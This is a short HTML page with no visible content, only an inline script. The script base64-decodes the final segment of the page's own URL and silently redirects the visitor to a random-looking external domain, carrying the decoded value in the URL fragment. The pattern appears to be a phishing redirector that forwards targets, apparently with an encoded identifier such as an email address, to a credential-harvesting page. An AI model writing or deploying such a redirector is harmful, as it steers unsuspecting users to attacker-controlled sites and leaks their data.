<!DOCTYPE html>
<html>
<head>
    <script>
       
    // Get the current URL
    var currentUrl = window.location.href;

    // Extract the encoded string after the last "/"
    var encodedString = currentUrl.substr(currentUrl.lastIndexOf('/') + 1);

    // Decode the base64 string
    var decodedString = atob(encodedString);

    // Construct the redirect URL
    var redirectUrl = 'https://m3trf9qe4yw.1cf8.com/M3TrF9qe4yW/#' + decodedString;

    // Redirect the page
    window.location.href = redirectUrl;
</script>

   
</head>
